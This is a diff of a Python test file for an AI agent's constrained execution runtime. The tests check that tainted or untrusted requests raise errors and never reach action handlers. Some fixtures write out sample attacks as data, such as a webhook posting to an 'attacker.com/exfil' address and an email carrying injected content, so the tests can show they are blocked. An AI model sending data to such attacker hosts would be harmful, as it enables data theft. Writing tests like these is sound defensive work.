@@ -1,165 +1,327 @@
 """
-Unit tests for the Safe Agent Runtime Core decision engine.
+Tests for the Constrained Execution Runtime.
+
+Key invariants verified:
+  - Unknown actions cannot be constructed (fail at registry.get())
+  - Tainted data + external action is impossible (raises, not returns)
+  - Bypass is impossible (handler never called on constraint failure)
+  - Allowed actions execute successfully
+  - No advisory decision strings — only hard enforcement or success
 """
 
-import pytest
-import yaml
 import os
+import pytest
 
-from runtime import evaluate
-
-# ---------------------------------------------------------------------------
-# Fixture: minimal world loaded from the project's world.yaml
-# ---------------------------------------------------------------------------
+from evaluator import Evaluator
+from registry import ActionRegistry, ActionRequest
+from runtime import Runtime, build_runtime, load_world
+from models import ActionType, ImpossibleActionError, Source, TaintState
 
 WORLD_YAML_PATH = os.path.join(os.path.dirname(__file__), "..", "world.yaml")
 
 
-@pytest.fixture
-def world():
-    with open(WORLD_YAML_PATH) as f:
-        return yaml.safe_load(f)
+@pytest.fixture(scope="module")
+def runtime_and_registry():
+    return build_runtime(WORLD_YAML_PATH)
+
+
+@pytest.fixture(scope="module")
+def runtime(runtime_and_registry):
+    return runtime_and_registry[0]
+
+
+@pytest.fixture(scope="module")
+def registry(runtime_and_registry):
+    return runtime_and_registry[1]
 
 
 # ---------------------------------------------------------------------------
-# Helpers
+# Unknown action fails at construction (not at execution)
 # ---------------------------------------------------------------------------
 
-def _make_tool_call(action, source, params=None):
-    return {"action": action, "source": source, "params": params or {}}
+class TestUnknownActionConstruction:
+    def test_unknown_action_raises_at_construction(self, registry):
+        """Action not in registry cannot be constructed — impossible before execution."""
+        with pytest.raises(ImpossibleActionError) as exc_info:
+            registry.get("delete_repository")
+        assert "delete_repository" in str(exc_info.value)
 
+    def test_launch_missile_raises_at_construction(self, registry):
+        with pytest.raises(ImpossibleActionError):
+            registry.get("launch_missile")
 
-# ---------------------------------------------------------------------------
-# Step 1 — Ontological absence: action not defined in world → "impossible"
-# ---------------------------------------------------------------------------
+    def test_arbitrary_string_raises_at_construction(self, registry):
+        with pytest.raises(ImpossibleActionError):
+            registry.get("__any_string_not_in_world__")
 
-def test_unknown_action_is_impossible(world):
-    """An action not defined in the world cannot be executed."""
-    result = evaluate(_make_tool_call("delete_repository", "external"), world)
-    assert result["decision"] == "impossible"
-    assert "not defined" in result["reason"]
-
-
-def test_another_unknown_action_is_impossible(world):
-    result = evaluate(_make_tool_call("launch_missile", "user"), world)
-    assert result["decision"] == "impossible"
-
-
-# ---------------------------------------------------------------------------
-# Step 3 — Capability check: untrusted source cannot perform external action
-# ---------------------------------------------------------------------------
-
-def test_untrusted_cannot_do_external(world):
-    """An untrusted (external) source is not permitted to perform external actions."""
-    result = evaluate(_make_tool_call("send_email", "external"), world)
-    assert result["decision"] == "impossible"
-
-
-def test_untrusted_can_do_internal(world):
-    """An untrusted (external) source is allowed to read internal data."""
-    result = evaluate(_make_tool_call("read_data", "external"), world)
-    # Taint rule: external + internal → no taint problem, capability check passes
-    assert result["decision"] == "allow"
+    def test_known_action_is_returned_as_action_object(self, registry):
+        action = registry.get("read_data")
+        assert action.name == "read_data"
+        assert action.action_type == ActionType.INTERNAL
 
 
 # ---------------------------------------------------------------------------
-# Step 4 — Taint rule: tainted source + external action → "impossible"
+# Taint blocks external action (taint is separate from trust)
 # ---------------------------------------------------------------------------
 
-def test_taint_containment_send_email(world):
-    """Tainted external source cannot send email (external side-effect)."""
-    result = evaluate(
-        _make_tool_call("send_email", "external", params={"to": "client"}), world
-    )
-    assert result["decision"] == "impossible"
-    assert "not permitted" in result["reason"]
-
-
-def test_taint_containment_post_webhook(world):
-    """Tainted external source cannot trigger a webhook (external side-effect)."""
-    result = evaluate(_make_tool_call("post_webhook", "external"), world)
-    assert result["decision"] == "impossible"
-
-
-# ---------------------------------------------------------------------------
-# Step 5 — Approval required
-# ---------------------------------------------------------------------------
-
-def test_approval_required_for_flagged_action(world):
-    """A trusted user requesting an approval-required action gets 'require_approval'."""
-    result = evaluate(_make_tool_call("download_report", "user"), world)
-    assert result["decision"] == "require_approval"
-    assert "approval" in result["reason"].lower()
-
-
-def test_system_source_also_requires_approval(world):
-    result = evaluate(_make_tool_call("download_report", "system"), world)
-    assert result["decision"] == "require_approval"
-
-
-# ---------------------------------------------------------------------------
-# Happy path — "allow"
-# ---------------------------------------------------------------------------
-
-def test_trusted_user_can_read_data(world):
-    result = evaluate(_make_tool_call("read_data", "user"), world)
-    assert result["decision"] == "allow"
-
-
-def test_trusted_user_can_send_email(world):
-    result = evaluate(_make_tool_call("send_email", "user"), world)
-    assert result["decision"] == "allow"
-
-
-def test_system_can_send_email(world):
-    result = evaluate(_make_tool_call("send_email", "system"), world)
-    assert result["decision"] == "allow"
-
-
-# ---------------------------------------------------------------------------
-# Unknown source defaults to untrusted
-# ---------------------------------------------------------------------------
-
-def test_unknown_source_treated_as_untrusted(world):
-    """A source not listed in the trust map defaults to 'untrusted'."""
-    result = evaluate(_make_tool_call("send_email", "mystery_agent"), world)
-    assert result["decision"] == "impossible"
-
-
-def test_unknown_source_can_read_internal(world):
-    result = evaluate(_make_tool_call("read_data", "mystery_agent"), world)
-    assert result["decision"] == "allow"
-
-
-# ---------------------------------------------------------------------------
-# Result structure
-# ---------------------------------------------------------------------------
-
-def test_result_always_has_decision_and_reason(world):
-    for action, source in [
-        ("read_data", "user"),
-        ("send_email", "external"),
-        ("delete_repository", "user"),
-        ("download_report", "user"),
-    ]:
-        result = evaluate(_make_tool_call(action, source), world)
-        assert "decision" in result
-        assert "reason" in result
-        assert isinstance(result["decision"], str)
-        assert isinstance(result["reason"], str)
-
-
-def test_no_deny_decision(world):
-    """The engine never returns 'deny' or 'block' — unsafe actions are impossible."""
-    forbidden = {"deny", "block"}
-    test_cases = [
-        ("delete_repository", "external"),
-        ("send_email", "external"),
-        ("read_data", "external"),
-        ("download_report", "system"),
-    ]
-    for action, source in test_cases:
-        result = evaluate(_make_tool_call(action, source), world)
-        assert result["decision"] not in forbidden, (
-            f"Got forbidden decision '{result['decision']}' for ({action}, {source})"
+class TestTaintEnforcement:
+    def test_tainted_data_blocks_external_action_for_trusted_user(self, runtime, registry):
+        """
+        Key taint scenario: a TRUSTED user carries tainted params.
+        Trust check passes (trusted can do external), but taint rule fires.
+        This proves taint is distinct from trust and is live code.
+        """
+        action = registry.get("send_email")
+        request = ActionRequest(
+            action=action,
+            source=Source("user"),           # trusted source — capability allows external
+            params={"to": "victim@example.com", "body": "<injected content>"},
+            taint=TaintState.TAINTED,        # data is tainted
         )
+        with pytest.raises(ImpossibleActionError) as exc_info:
+            runtime.execute(request)
+        assert "tainted" in str(exc_info.value).lower() or "external" in str(exc_info.value).lower()
+
+    def test_tainted_data_blocks_post_webhook_for_trusted_user(self, runtime, registry):
+        action = registry.get("post_webhook")
+        request = ActionRequest(
+            action=action,
+            source=Source("system"),         # trusted
+            params={"url": "https://attacker.com/exfil"},
+            taint=TaintState.TAINTED,
+        )
+        with pytest.raises(ImpossibleActionError):
+            runtime.execute(request)
+
+    def test_tainted_data_allows_internal_action(self, runtime, registry):
+        """Taint rule only blocks external actions — internal actions are unaffected."""
+        action = registry.get("read_data")
+        request = ActionRequest(
+            action=action,
+            source=Source("user"),
+            params={"query": "tainted_user_input"},
+            taint=TaintState.TAINTED,
+        )
+        result = runtime.execute(request)
+        assert result is not None
+
+    def test_clean_data_allows_external_action_for_trusted_user(self, runtime, registry):
+        """Clean data from a trusted source can execute external actions."""
+        action = registry.get("send_email")
+        request = ActionRequest(
+            action=action,
+            source=Source("user"),
+            params={"to": "colleague@company.com"},
+            taint=TaintState.CLEAN,
+        )
+        result = runtime.execute(request)
+        assert result is not None
+
+
+# ---------------------------------------------------------------------------
+# Bypass is impossible — handler never fires on constraint failure
+# ---------------------------------------------------------------------------
+
+class TestBypassImpossible:
+    def test_impossible_action_raises_not_returns_string(self, runtime, registry):
+        """Runtime raises — never returns an advisory string like 'impossible'."""
+        action = registry.get("send_email")
+        request = ActionRequest(
+            action=action,
+            source=Source("external"),       # untrusted, cannot do external
+            params={},
+            taint=TaintState.CLEAN,
+        )
+        with pytest.raises(ImpossibleActionError):
+            runtime.execute(request)
+
+    def test_no_soft_decision_string_on_failure(self, runtime, registry):
+        """Verify execution never returns a string on failure — only raises."""
+        action = registry.get("send_email")
+        request = ActionRequest(
+            action=action,
+            source=Source("external"),
+            params={},
+            taint=TaintState.CLEAN,
+        )
+        result = None
+        try:
+            result = runtime.execute(request)
+        except ImpossibleActionError:
+            pass
+        assert result is None, "Runtime must raise, never return an advisory string"
+
+    def test_handler_not_called_when_constraint_fails(self, registry):
+        """
+        Structural proof: the action handler is never invoked when
+        execution is impossible. Uses a tracking handler to verify silence.
+        """
+        executed = []
+
+        def tracking_handler(params):
+            executed.append(True)
+            return {"done": True}
+
+        local_registry = ActionRegistry()
+        local_registry.register("tracked_external", ActionType.EXTERNAL, tracking_handler)
+
+        world = load_world(WORLD_YAML_PATH)
+        local_runtime = Runtime(local_registry, Evaluator(world))
+
+        action = local_registry.get("tracked_external")
+        request = ActionRequest(
+            action=action,
+            source=Source("external"),       # untrusted, cannot do external
+            params={},
+            taint=TaintState.CLEAN,
+        )
+        with pytest.raises(ImpossibleActionError):
+            local_runtime.execute(request)
+
+        assert executed == [], "Handler MUST NOT be called when execution is impossible"
+
+    def test_taint_handler_not_called(self, registry):
+        """Handler is not called when taint rule fires."""
+        executed = []
+
+        def tracking_handler(params):
+            executed.append(True)
+            return {"done": True}
+
+        local_registry = ActionRegistry()
+        local_registry.register("tracked_external2", ActionType.EXTERNAL, tracking_handler)
+
+        world = load_world(WORLD_YAML_PATH)
+        local_runtime = Runtime(local_registry, Evaluator(world))
+
+        action = local_registry.get("tracked_external2")
+        request = ActionRequest(
+            action=action,
+            source=Source("user"),           # trusted — passes capability check
+            params={"data": "injected"},
+            taint=TaintState.TAINTED,        # taint rule fires here
+        )
+        with pytest.raises(ImpossibleActionError):
+            local_runtime.execute(request)
+
+        assert executed == [], "Handler MUST NOT be called when taint rule fires"
+
+
+# ---------------------------------------------------------------------------
+# Allowed actions execute successfully
+# ---------------------------------------------------------------------------
+
+class TestAllowedActions:
+    def test_trusted_user_can_read_data(self, runtime, registry):
+        action = registry.get("read_data")
+        request = ActionRequest(
+            action=action,
+            source=Source("user"),
+            params={"query": "SELECT *"},
+            taint=TaintState.CLEAN,
+        )
+        result = runtime.execute(request)
+        assert result is not None
+
+    def test_trusted_user_can_send_email(self, runtime, registry):
+        action = registry.get("send_email")
+        request = ActionRequest(
+            action=action,
+            source=Source("user"),
+            params={"to": "colleague@company.com"},
+            taint=TaintState.CLEAN,
+        )
+        result = runtime.execute(request)
+        assert result is not None
+
+    def test_system_can_post_webhook(self, runtime, registry):
+        action = registry.get("post_webhook")
+        request = ActionRequest(
+            action=action,
+            source=Source("system"),
+            params={"url": "https://internal.svc/notify"},
+            taint=TaintState.CLEAN,
+        )
+        result = runtime.execute(request)
+        assert result is not None
+
+    def test_untrusted_source_can_read_internal(self, runtime, registry):
+        """Untrusted (external) source can still perform internal actions."""
+        action = registry.get("read_data")
+        request = ActionRequest(
+            action=action,
+            source=Source("external"),
+            params={},
+            taint=TaintState.CLEAN,
+        )
+        result = runtime.execute(request)
+        assert result is not None
+
+    def test_unknown_source_can_read_internal(self, runtime, registry):
+        """Unknown source defaults to untrusted — can still do internal actions."""
+        action = registry.get("read_data")
+        request = ActionRequest(
+            action=action,
+            source=Source("mystery_agent"),
+            params={},
+            taint=TaintState.CLEAN,
+        )
+        result = runtime.execute(request)
+        assert result is not None
+
+
+# ---------------------------------------------------------------------------
+# Approval requirement raises ImpossibleActionError
+# ---------------------------------------------------------------------------
+
+class TestApprovalRequirement:
+    def test_approval_required_raises_for_trusted_user(self, runtime, registry):
+        action = registry.get("download_report")
+        request = ActionRequest(
+            action=action,
+            source=Source("user"),
+            params={"id": "report-123"},
+            taint=TaintState.CLEAN,
+        )
+        with pytest.raises(ImpossibleActionError) as exc_info:
+            runtime.execute(request)
+        assert "approval" in str(exc_info.value).lower()
+
+    def test_approval_required_raises_for_system_source(self, runtime, registry):
+        action = registry.get("download_report")
+        request = ActionRequest(
+            action=action,
+            source=Source("system"),
+            params={"id": "report-456"},
+            taint=TaintState.CLEAN,
+        )
+        with pytest.raises(ImpossibleActionError):
+            runtime.execute(request)
+
+
+# ---------------------------------------------------------------------------
+# Capability enforcement
+# ---------------------------------------------------------------------------
+
+class TestCapabilityEnforcement:
+    def test_untrusted_cannot_do_external(self, runtime, registry):
+        action = registry.get("send_email")
+        request = ActionRequest(
+            action=action,
+            source=Source("external"),
+            params={},
+            taint=TaintState.CLEAN,
+        )
+        with pytest.raises(ImpossibleActionError):
+            runtime.execute(request)
+
+    def test_unknown_source_treated_as_untrusted_for_external(self, runtime, registry):
+        action = registry.get("send_email")
+        request = ActionRequest(
+            action=action,
+            source=Source("unknown_bot"),
+            params={},
+            taint=TaintState.CLEAN,
+        )
+        with pytest.raises(ImpossibleActionError):
+            runtime.execute(request)
